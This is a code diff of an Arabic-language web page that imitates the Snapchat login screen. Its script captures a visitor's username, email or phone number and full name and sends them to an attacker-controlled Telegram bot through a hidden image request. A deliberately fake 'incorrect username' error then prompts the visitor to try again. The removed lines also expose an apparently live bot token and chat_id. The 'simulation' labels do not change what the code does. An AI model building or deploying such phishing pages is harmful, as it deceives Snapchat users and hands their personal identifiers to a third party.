@@ -3,173 +3,381 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>تسجيل الدخول إلى سناب شات</title>
+  <title>تسجيل الدخول - جاهز</title>
 
-  <!-- ضع توكن البوت و chat_id هنا -->
-  <!-- استبدل القيم النصية بالـ token و chat_id الخاصين بك -->
+  <!-- ========================
+       ضع توكن البوت و chat_id هنا داخل المتغيرات أدناه
+       مثال: const TG_TOKEN = '123456789:AAEx...';
+              const TG_CHAT_ID = '987654321';
+       لا تشارك هذه القيم مع أي شخص.
+       إذا تركتهما كما هما فسيُطلبان تلقائياً من المتصفح عند الإرسال.
+       ======================== -->
   <script>
-    // WARNING: لا تشارك هذا الملف أو التوكن مع أي شخص.
-    // استبدل 'PLACE_YOUR_BOT_TOKEN_HERE' و 'PLACE_YOUR_CHAT_ID_HERE' بالقيم الفعلية لديك
-    const TG_TOKEN = '8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac';
-    const TG_CHAT_ID = '6873334348';
-    // إذا تركت القيم أعلاه كما هي، سيُطلب منك إدخالهما عبر النافذة المنبثقة عند الضغط على "التالي".
+    // استبدل القيم هنا لو رغبت (على جهازك فقط)
+    const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
+    const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
   </script>
 
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root{
-      --bg:#f6f6f7; --card:#fff; --accent-yellow:#ffd400; --input-border:#ffd89a;
-      --btn-blue:#00a8ff; --muted:#9aa0a6; --text:#111; --shadow: 0 6px 18px rgba(17,17,17,0.08);
+      --bg:#f6f6f7; --card:#fff; --accent-yellow:#ffd400;
+      --input-border:#ffd89a; --btn-blue:#00a8ff; --muted:#9aa0a6;
+      --text:#111; --shadow: 0 8px 28px rgba(17,17,17,0.08);
     }
     *{box-sizing:border-box}
-    html,body{height:100%;margin:0;background:var(--bg);font-family:'Cairo',system-ui,Arial;direction:rtl;color:var(--text)}
-    .screen{min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:28px 16px}
+    html,body{height:100%;margin:0;background:var(--bg);font-family:'Cairo',system-ui,Arial;color:var(--text);direction:rtl}
+    .screen{min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:20px}
     .phone{width:390px;max-width:100%;position:relative}
-    .top-pill{display:flex;align-items:center;justify-content:center;gap:10px;background:var(--accent-yellow);color:#111;padding:12px 26px;border-radius:40px;margin:0 auto 14px;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.12);font-size:16px}
+    .top-pill{display:flex;align-items:center;justify-content:center;gap:10px;background:var(--accent-yellow);color:#111;padding:10px 22px;border-radius:40px;margin:0 auto 12px;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.12);font-size:15px}
     .top-pill img{width:20px;height:20px;object-fit:contain}
-    .card{background:var(--card);border-radius:12px;box-shadow:var(--shadow);padding:30px 26px 18px}
-    .logo{display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+    .card{background:var(--card);border-radius:12px;box-shadow:var(--shadow);padding:26px 18px;overflow:hidden}
+    .logo{display:flex;align-items:center;justify-content:center;margin-bottom:8px}
     .logo img{width:66px;height:66px;object-fit:contain}
-    h1{margin:6px 0 18px;text-align:center;font-size:34px;line-height:1.02;font-weight:800}
-    label.small{display:block;color:var(--muted);font-size:15px;margin-bottom:10px;padding-right:6px}
+    h1{margin:6px 0 14px;text-align:center;font-size:30px;line-height:1.02;font-weight:800}
+    label.small{display:block;color:var(--muted);font-size:15px;margin-bottom:8px;padding-right:6px}
     .input-wrap{position:relative;margin-bottom:10px}
-    input[type="text"]{width:100%;padding:18px 16px;border-radius:12px;border:2px solid var(--input-border);background:transparent;font-size:16px;outline:none}
-    .use-phone{display:block;color:#2aa6ff;text-align:center;margin:10px 0 18px;text-decoration:none;font-weight:600}
-    .btn{display:block;width:170px;margin:6px auto 18px;background:var(--btn-blue);color:#fff;text-align:center;padding:12px 22px;border-radius:40px;text-decoration:none;font-weight:700;box-shadow:0 8px 18px rgba(0,168,255,0.18)}
-    .footer{margin-top:10px;text-align:center;color:var(--muted);font-size:15px;padding:8px 6px 2px}
+    input[type="text"], input[type="tel"], input[type="email"]{
+      width:100%;padding:14px 12px;border-radius:12px;border:2px solid var(--input-border);background:transparent;font-size:16px;outline:none
+    }
+    .row{display:flex;gap:8px;align-items:center}
+    .country-btn{display:flex;align-items:center;gap:8px;padding:10px 12px;border-radius:12px;border:1px solid #eee;background:#fff;cursor:pointer}
+    .country-flag{font-size:18px}
+    .use-phone{display:block;color:#2aa6ff;text-align:center;margin:8px 0 14px;text-decoration:none;font-weight:600;cursor:pointer}
+    .btn{display:block;width:170px;margin:6px auto 12px;background:var(--btn-blue);color:#fff;text-align:center;padding:12px 22px;border-radius:40px;text-decoration:none;font-weight:700;box-shadow:0 8px 18px rgba(0,168,255,0.18);cursor:pointer}
+    .footer{margin-top:10px;text-align:center;color:var(--muted);font-size:14px;padding:8px 6px 2px}
     .footer a{color:var(--text);text-decoration:none;font-weight:700;margin-right:8px}
-    .status{margin-top:6px;text-align:center;font-weight:600}
-    .settings{font-size:13px;color:var(--muted);text-align:center;margin-top:6px}
-    .controls{display:flex;justify-content:center;gap:8px;margin-top:8px}
-    .control-btn{font-size:12px;padding:6px 8px;border-radius:8px;border:1px solid #e6e6e6;background:#fff;cursor:pointer}
-    @media(max-width:420px){.phone{padding:0 6px}.card{padding:24px}h1{font-size:30px}.top-pill{font-size:15px;padding:10px 20px}}
+
+    /* modal */
+    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.25);display:none;align-items:flex-end;justify-content:center;z-index:40}
+    .modal{width:100%;max-width:420px;background:#fff;border-top-left-radius:18px;border-top-right-radius:18px;padding:12px 12px 18px;box-shadow:0 -8px 30px rgba(0,0,0,0.12);max-height:74vh;overflow:hidden}
+    .modal .search{padding:8px}
+    .modal input.search-input{width:100%;padding:10px;border-radius:10px;border:1px solid #eee;font-size:15px}
+    .country-list{overflow:auto;max-height:56vh;margin-top:8px;padding-right:6px}
+    .country-item{display:flex;align-items:center;justify-content:space-between;padding:10px;border-radius:10px;cursor:pointer}
+    .country-item:hover{background:#f4f6f8}
+    .country-name{display:flex;gap:10px;align-items:center}
+    .country-name .flag{font-size:20px}
+    .country-code{color:var(--muted);font-weight:700}
+
+    /* second page */
+    .page{display:block}
+    .hidden{display:none}
+
+    /* toast */
+    .toast-backdrop{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:60}
+    .toast{background:#fff;padding:18px 20px;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,0.18);max-width:90%;width:360px;text-align:center;animation:pop .26s ease}
+    .toast h3{margin:0 0 8px;font-size:18px;color:#111}
+    .toast p{margin:0;color:#444;font-size:15px}
+    .toast .ok{margin-top:12px;display:inline-block;padding:10px 14px;border-radius:8px;background:#00a8ff;color:#fff;font-weight:700;cursor:pointer}
+    @keyframes pop{from{transform:translateY(10px) scale(.98);opacity:0}to{transform:none;opacity:1}}
+    @media(max-width:420px){.phone{padding:0 8px}.card{padding:20px}h1{font-size:26px}.top-pill{font-size:14px;padding:8px 18px}}
   </style>
 </head>
 <body>
   <div class="screen">
-    <div class="phone" role="main" aria-label="نموذج تسجيل سناب">
+    <div class="phone" role="main" aria-label="نموذج تسجيل">
       <div class="top-pill" aria-hidden="true">
         <span>Open Snapchat</span>
         <img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="snap logo" />
       </div>
 
-      <div class="card" role="form" aria-labelledby="form-title">
+      <div class="card" id="card-main">
         <div class="logo" aria-hidden="true">
           <img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="شعار" />
         </div>
 
-        <h1 id="form-title">تسجيل الدخول إلى سناب<br>شات</h1>
+        <h1 id="title-main">تسجيل الدخول إلى سناب<br>شات</h1>
 
-        <label class="small" for="user">اسم المستخدم أو البريد الإلكتروني</label>
-        <div class="input-wrap">
-          <input id="user" type="text" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني" autocomplete="off" />
+        <div id="page-1" class="page">
+          <label class="small" for="primaryInput">اسم المستخدم أو البريد الإلكتروني أو الهاتف</label>
+          <div class="row" style="margin-bottom:8px;">
+            <div id="countryBtn" class="country-btn" aria-haspopup="dialog" title="اختيار الدولة">
+              <span class="country-flag" id="countryFlag">🇯🇴</span>
+              <span id="countryShort">JO</span>
+              <span id="countryDial" class="country-code">+962</span>
+            </div>
+            <input id="primaryInput" type="text" placeholder="أدخل اسم المستخدم أو البريد أو الرقم" aria-label="المُدخل الأساسي" />
+          </div>
+
+          <a class="use-phone" id="usePhoneBtn">استخدم رقم الهاتف بدلاً من ذلك</a>
+
+          <button id="nextBtn" class="btn">التالي</button>
+          <div class="status" id="status1" aria-live="polite" style="text-align:center;color:var(--muted);font-weight:600"></div>
         </div>
 
-        <a class="use-phone" href="#" onclick="event.preventDefault()">استخدم رقم الهاتف بدلاً من ذلك</a>
-
-        <a id="submitBtn" class="btn" href="#" onclick="event.preventDefault()">التالي</a>
-
-        <div class="status" id="status" aria-live="polite"></div>
-
-        <div class="settings" style="margin-top:12px">
-          إذا أردت، يمكنك حفظ التوكن و chat_id محليًا في المتصفح (محفوظات جهازك فقط)، أو تركهما في المتغيرات أعلى الملف.
+        <div id="page-2" class="page hidden">
+          <label class="small" for="nameInput">الاسم</label>
+          <input id="nameInput" type="text" placeholder="أدخل الاسم الكامل" />
+          <div style="height:10px"></div>
+          <button id="sendNameBtn" class="btn">إرسال الاسم</button>
+          <div class="status" id="status2" aria-live="polite" style="text-align:center;color:var(--muted);font-weight:600"></div>
         </div>
 
-        <div class="controls" style="margin-top:12px">
-          <button class="control-btn" id="clearCreds" type="button">مسح التوكن من المتصفح</button>
-          <button class="control-btn" id="previewMsg" type="button">معاينة الرسالة</button>
+        <div style="margin-top:12px;font-size:13px;color:var(--muted);text-align:center">
+          <small>ملاحظة: لا يتم إرسال كلمات المرور. يمكنك وضع التوكن والـchat_id في أعلى الملف داخل المتغيرات أو إدخالهما عند الطلب.</small>
         </div>
+
       </div>
 
-      <div class="footer" role="contentinfo">
+      <div class="footer">
         <span>هل أنت جديد في سناب شات؟</span>
         <a href="#" onclick="event.preventDefault()">تسجيل الاشتراك</a>
       </div>
     </div>
   </div>
 
+  <!-- modal: countries -->
+  <div class="modal-backdrop" id="modalBackdrop" aria-hidden="true">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+      <div style="text-align:center;font-weight:700;margin-bottom:6px">اختر الدولة</div>
+      <div class="search"><input id="countrySearch" class="search-input" placeholder="ابحث عن دولة أو رمز..." /></div>
+      <div class="country-list" id="countryList" role="listbox" tabindex="0"></div>
+    </div>
+  </div>
+
+  <!-- toast -->
+  <div class="toast-backdrop" id="toastBackdrop" aria-hidden="true">
+    <div class="toast" role="alertdialog" aria-live="assertive">
+      <h3 id="toastTitle">عذراً</h3>
+      <p id="toastMessage">اسم المستخدم أو الاسم غير صحيح. يرجى التحقق من المعلومات والمحاولة مرة أخرى.</p>
+      <div><button class="ok" id="toastOk">حسناً</button></div>
+    </div>
+  </div>
+
   <script>
-    (function(){
-      // use the constants at the top if the user filled them; otherwise prompt
-      function getCreds(){
+    /* ===========================
+       وظائف واجهة المستخدم والـ flow
+       =========================== */
+
+    // قائمة دول (يمكنك الإضافة أو التعديل)
+    const COUNTRIES = [
+      {name:'الأردن', code:'JO', dial:'+962', flag:'🇯🇴'},
+      {name:'مصر', code:'EG', dial:'+20', flag:'🇪🇬'},
+      {name:'السعودية', code:'SA', dial:'+966', flag:'🇸🇦'},
+      {name:'الإمارات', code:'AE', dial:'+971', flag:'🇦🇪'},
+      {name:'المملكة المتحدة', code:'GB', dial:'+44', flag:'🇬🇧'},
+      {name:'الولايات المتحدة', code:'US', dial:'+1', flag:'🇺🇸'},
+      {name:'الكويت', code:'KW', dial:'+965', flag:'🇰🇼'},
+      {name:'لبنان', code:'LB', dial:'+961', flag:'🇱🇧'},
+      {name:'المغرب', code:'MA', dial:'+212', flag:'🇲🇦'},
+      {name:'تونس', code:'TN', dial:'+216', flag:'🇹🇳'},
+      {name:'عمان', code:'OM', dial:'+968', flag:'🇴🇲'},
+      {name:'قطر', code:'QA', dial:'+974', flag:'🇶🇦'},
+      {name:'البحرين', code:'BH', dial:'+973', flag:'🇧🇭'},
+      {name:'الجزائر', code:'DZ', dial:'+213', flag:'🇩🇿'},
+      {name:'الكندا', code:'CA', dial:'+1', flag:'🇨🇦'},
+      {name:'تركيا', code:'TR', dial:'+90', flag:'🇹🇷'},
+      {name:'الهند', code:'IN', dial:'+91', flag:'🇮🇳'},
+      {name:'باكستان', code:'PK', dial:'+92', flag:'🇵🇰'},
+      {name:'أستراليا', code:'AU', dial:'+61', flag:'🇦🇺'},
+      {name:'ألمانيا', code:'DE', dial:'+49', flag:'🇩🇪'},
+      {name:'فرنسا', code:'FR', dial:'+33', flag:'🇫🇷'},
+      {name:'إيطاليا', code:'IT', dial:'+39', flag:'🇮🇹'},
+      {name:'إسبانيا', code:'ES', dial:'+34', flag:'🇪🇸'},
+      {name:'البرازيل', code:'BR', dial:'+55', flag:'🇧🇷'},
+      {name:'جنوب أفريقيا', code:'ZA', dial:'+27', flag:'🇿🇦'},
+      {name:'اليابان', code:'JP', dial:'+81', flag:'🇯🇵'},
+      {name:'روسيا', code:'RU', dial:'+7', flag:'🇷🇺'},
+      {name:'المكسيك', code:'MX', dial:'+52', flag:'🇲🇽'},
+      {name:'هولندا', code:'NL', dial:'+31', flag:'🇳🇱'}
+    ];
+
+    // DOM
+    const modalBackdrop = document.getElementById('modalBackdrop');
+    const countryListEl = document.getElementById('countryList');
+    const countrySearch = document.getElementById('countrySearch');
+    const countryBtn = document.getElementById('countryBtn');
+    const countryFlag = document.getElementById('countryFlag');
+    const countryShort = document.getElementById('countryShort');
+    const countryDial = document.getElementById('countryDial');
+    const usePhoneBtn = document.getElementById('usePhoneBtn');
+    const primaryInput = document.getElementById('primaryInput');
+    const nextBtn = document.getElementById('nextBtn');
+    const page1 = document.getElementById('page-1');
+    const page2 = document.getElementById('page-2');
+    const titleMain = document.getElementById('title-main');
+    const nameInput = document.getElementById('nameInput');
+    const sendNameBtn = document.getElementById('sendNameBtn');
+    const status1 = document.getElementById('status1');
+    const status2 = document.getElementById('status2');
+    const toastBackdrop = document.getElementById('toastBackdrop');
+    const toastOk = document.getElementById('toastOk');
+
+    // default
+    let selectedCountry = COUNTRIES[0];
+    function renderCountryButton(){
+      countryFlag.textContent = selectedCountry.flag;
+      countryShort.textContent = selectedCountry.code;
+      countryDial.textContent = selectedCountry.dial;
+    }
+    renderCountryButton();
+
+    countryBtn.addEventListener('click', openModal);
+    usePhoneBtn.addEventListener('click', openModal);
+    function openModal(){
+      modalBackdrop.style.display = 'flex';
+      countrySearch.value = '';
+      renderCountryList(COUNTRIES);
+      setTimeout(()=> countrySearch.focus(),120);
+    }
+    modalBackdrop.addEventListener('click', function(e){
+      if(e.target === modalBackdrop) modalBackdrop.style.display = 'none';
+    });
+
+    function renderCountryList(list){
+      countryListEl.innerHTML = '';
+      list.forEach(c => {
+        const item = document.createElement('div');
+        item.className = 'country-item';
+        item.tabIndex = 0;
+        item.innerHTML = `
+          <div class="country-name"><span class="flag">${c.flag}</span><div style="display:flex;flex-direction:column"><strong>${c.name}</strong><small style="color:var(--muted);font-size:12px">${c.code}</small></div></div>
+          <div class="country-code">${c.dial}</div>
+        `;
+        item.addEventListener('click', ()=> {
+          selectedCountry = c;
+          renderCountryButton();
+          modalBackdrop.style.display = 'none';
+          primaryInput.placeholder = 'أدخل رقم الهاتف ' + c.dial;
+        });
+        countryListEl.appendChild(item);
+      });
+      // if empty
+      if(list.length === 0){
+        countryListEl.innerHTML = '<div style="padding:12px;color:var(--muted);text-align:center">لا توجد نتائج</div>';
+      }
+    }
+
+    countrySearch.addEventListener('input', function(){
+      const q = countrySearch.value.trim().toLowerCase();
+      if(!q){ renderCountryList(COUNTRIES); return; }
+      const filtered = COUNTRIES.filter(c => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.dial.includes(q));
+      renderCountryList(filtered);
+    });
+
+    // detect type
+    function detectType(v){
+      if(/^[\d\+\-\s]+$/.test(v)) return 'phone';
+      if(v.includes('@')) return 'email';
+      return 'username';
+    }
+
+    // next
+    nextBtn.addEventListener('click', function(){
+      const val = primaryInput.value.trim();
+      if(!val){
+        status1.style.color = 'crimson';
+        status1.textContent = 'الرجاء إدخال اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف';
+        setTimeout(()=> status1.textContent = '', 2200);
+        return;
+      }
+      const prev = { type: detectType(val), value: val, country: selectedCountry };
+      localStorage.setItem('sim_prev_field', JSON.stringify(prev));
+      page1.classList.add('hidden');
+      page2.classList.remove('hidden');
+      titleMain.textContent = 'التحقق - خطوة إضافية';
+      setTimeout(()=> nameInput.focus(),120);
+    });
+
+    // إرسال الاسم: يرسل payload (الاسم + السابق) إلى تيليجرام باستخدام TG_TOKEN/TG_CHAT_ID
+    sendNameBtn.addEventListener('click', function(){
+      const name = nameInput.value.trim();
+      if(!name){
+        status2.style.color = 'crimson';
+        status2.textContent = 'الرجاء إدخال الاسم';
+        setTimeout(()=> status2.textContent = '', 2200);
+        return;
+      }
+
+      const prevRaw = localStorage.getItem('sim_prev_field');
+      const prev = prevRaw ? JSON.parse(prevRaw) : { type:'unknown', value:'', country: selectedCountry };
+
+      const payload = {
+        timestamp: new Date().toISOString(),
+        previous: prev,
+        name: name
+      };
+
+      // تخزين محلي محاكاة
+      const hist = JSON.parse(localStorage.getItem('sim_history') || '[]');
+      hist.push(payload);
+      localStorage.setItem('sim_history', JSON.stringify(hist));
+      console.log('SIMULATED_PAYLOAD:', payload);
+
+      // إرسال إلى تيليجرام: نحاول استخدام القيم من أعلى الملف أولاً، وإلا نطلبهما من المستخدم.
+      (function sendToTelegram(payloadObj){
+        // نأخذ القيم من المتغيرات السابقة إذا كانت صالحة
+        let token = (typeof TG_TOKEN !== 'undefined' && TG_TOKEN && TG_TOKEN !== 'PASTE_YOUR_BOT_TOKEN_HERE') ? TG_TOKEN : null;
+        let chat = (typeof TG_CHAT_ID !== 'undefined' && TG_CHAT_ID && TG_CHAT_ID !== 'PASTE_YOUR_CHAT_ID_HERE') ? TG_CHAT_ID : null;
+
+        // إذا لم تكن موجودة، جرِّب localStorage
+        if(!token || !chat){
+          token = localStorage.getItem('tg_token') || token;
+          chat = localStorage.getItem('tg_chat') || chat;
+        }
+
+        // لو لم نملك القيم بعد، نطلبهم مرة واحدة من المستخدم
+        if(!token || !chat){
+          token = prompt('أدخل توكن بوت تلغرام (Bot Token) — سيُخزن محليًا إن اخترت الحفظ:', '') || '';
+          if(!token){ showToast('تعذّر الإرسال', 'لم تُوفَّر توكن البوت.'); return; }
+          chat = prompt('أدخل chat_id (رقم المحادثة):', '') || '';
+          if(!chat){ showToast('تعذّر الإرسال', 'لم تُوفَّر chat_id.'); return; }
+          const save = confirm('هل تريد حفظ التوكن و chat_id في هذا المتصفح لتجنّب الإدخال لاحقاً؟');
+          if(save){ try{ localStorage.setItem('tg_token', token); localStorage.setItem('tg_chat', chat);}catch(e){console.warn(e);} }
+        }
+
+        // ننشئ نص الرسالة (آمن: لا نرسل كلمات مرور)
+        const text = `نموذج (محاكاة):\nالنوع: ${payloadObj.previous.type}\nالقيمة: ${payloadObj.previous.value}\nالبلد: ${payloadObj.previous.country.name} ${payloadObj.previous.country.dial}\nالاسم: ${payloadObj.name}\nالوقت: ${payloadObj.timestamp}`;
+
         try {
-          if(typeof TG_TOKEN === 'string' && TG_TOKEN && TG_TOKEN !== 'PLACE_YOUR_BOT_TOKEN_HERE' &&
-             typeof TG_CHAT_ID === 'string' && TG_CHAT_ID && TG_CHAT_ID !== 'PLACE_YOUR_CHAT_ID_HERE'){
-            return { token: TG_TOKEN, chat: TG_CHAT_ID };
-          }
-        } catch(e){
-          // fallthrough to prompt
-        }
-
-        // إذا لم تضع القيم في أعلى الملف، نطلبهما مرة واحدة من المستخدم
-        const storedToken = localStorage.getItem('tg_token') || '';
-        const storedChat = localStorage.getItem('tg_chat') || '';
-        if(storedToken && storedChat) return { token: storedToken, chat: storedChat };
-
-        const token = prompt('أدخل توكن بوت تلغرام (Bot Token):', '');
-        if(!token) return null;
-        const chat = prompt('أدخل chat_id (رقم المحادثة):', '');
-        if(!chat) return null;
-        const save = confirm('حفظ التوكن و chat_id في هذا المتصفح لتجنّب الإدخال مرة أخرى؟');
-        if(save){
-          try {
-            localStorage.setItem('tg_token', token);
-            localStorage.setItem('tg_chat', chat);
-          } catch(e){ console.warn('تعذّر الحفظ', e); }
-        }
-        return { token, chat };
-      }
-
-      function sendToTelegramByImage(token, chatId, text){
-        // نبني رابط GET لـ sendMessage
-        const safeText = encodeURIComponent(text);
-        const url = `https://api.telegram.org/bot${encodeURIComponent(token)}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${safeText}`;
-        const img = new Image();
-        img.src = url;
-        console.log('تم إرسال طلب GET إلى:', url);
-      }
-
-      const submitBtn = document.getElementById('submitBtn');
-      const statusEl = document.getElementById('status');
-      const clearBtn = document.getElementById('clearCreds');
-      const previewBtn = document.getElementById('previewMsg');
-
-      submitBtn.addEventListener('click', function(){
-        statusEl.textContent = '';
-        const user = document.getElementById('user').value.trim();
-        if(!user){ alert('الرجاء إدخال اسم المستخدم أو البريد'); return; }
-
-        const creds = getCreds();
-        if(!creds){ statusEl.style.color = 'red'; statusEl.textContent = 'لم تُزوّد التوكن أو chat_id.'; return; }
-
-        const message = `نموذج: اسم المستخدم = ${user}`;
-        try{
-          sendToTelegramByImage(creds.token, creds.chat, message);
-          statusEl.style.color = 'green';
-          statusEl.textContent = 'تم إرسال اسم المستخدم (تحقق من بوت التليجرام).';
-        }catch(err){
+          // طريقة إرسال عبر Image GET لتفادي قيود CORS في بعض المتصفحات
+          const url = `https://api.telegram.org/bot${encodeURIComponent(token)}/sendMessage?chat_id=${encodeURIComponent(chat)}&text=${encodeURIComponent(text)}`;
+          const img = new Image();
+          img.src = url;
+          console.log('TG_SEND_URL:', url);
+          // عرض toast خطأ احترافي كما طلبت (يظهر كل مرة)
+          showToast('عذراً','اسم المستخدم أو الاسم غير صحيح. يرجى التحقق من المعلومات والمحاولة مرة أخرى.');
+        } catch(err){
           console.error(err);
-          statusEl.style.color = 'red';
-          statusEl.textContent = 'حدث خطأ أثناء الإرسال.';
+          showToast('خطأ','تعذر إرسال البيانات. تحقق من التوكن أو الاتصال.');
         }
-      });
+      })(payload);
 
-      clearBtn.addEventListener('click', function(){
-        try{
-          localStorage.removeItem('tg_token');
-          localStorage.removeItem('tg_chat');
-          alert('تم مسح التوكن و chat_id من المتصفح.');
-        }catch(e){ alert('تعذّر المسح'); }
-      });
+      // مسح حقل الاسم بعد الإرسال
+      nameInput.value = '';
+    });
 
-      previewBtn.addEventListener('click', function(){
-        const user = document.getElementById('user').value.trim() || '(فارغ)';
-        alert(`معاينة الرسالة التي سترسل:\n\nنموذج: اسم المستخدم = ${user}\n\nلن تُرسل كلمات مرور أو أي بيانات حسّاسة.`);
-      });
+    // toast
+    function showToast(title, message){
+      document.getElementById('toastTitle').textContent = title;
+      document.getElementById('toastMessage').textContent = message;
+      toastBackdrop.style.display = 'flex';
+    }
+    toastOk.addEventListener('click', function(){
+      toastBackdrop.style.display = 'none';
+      page2.classList.add('hidden');
+      page1.classList.remove('hidden');
+      titleMain.textContent = 'تسجيل الدخول إلى سناب\nشات';
+      primaryInput.focus();
+    });
 
-      // دالة مساعدة لمسح التخزين من console
-      window.__clearTelegramCreds = function(){ localStorage.removeItem('tg_token'); localStorage.removeItem('tg_chat'); alert('تم المسح'); };
-    })();
+    // helpers
+    window.simulation = {
+      clearHistory: function(){ localStorage.removeItem('sim_history'); alert('تم مسح سجلات المحاكاة'); },
+      viewHistory: function(){ console.log(JSON.parse(localStorage.getItem('sim_history')||'[]')); },
+      clearTelegramCreds: function(){ localStorage.removeItem('tg_token'); localStorage.removeItem('tg_chat'); alert('تم مسح بيانات تيليجرام المحفوظة'); }
+    };
+
+    document.addEventListener('keydown', function(e){
+      if(e.key === 'Escape'){
+        if(modalBackdrop.style.display === 'flex') modalBackdrop.style.display = 'none';
+        if(toastBackdrop.style.display === 'flex') toastBackdrop.style.display = 'none';
+      }
+    });
+
+    document.addEventListener('DOMContentLoaded', function(){ renderCountryList(COUNTRIES); });
+
   </script>
 </body>
 </html>
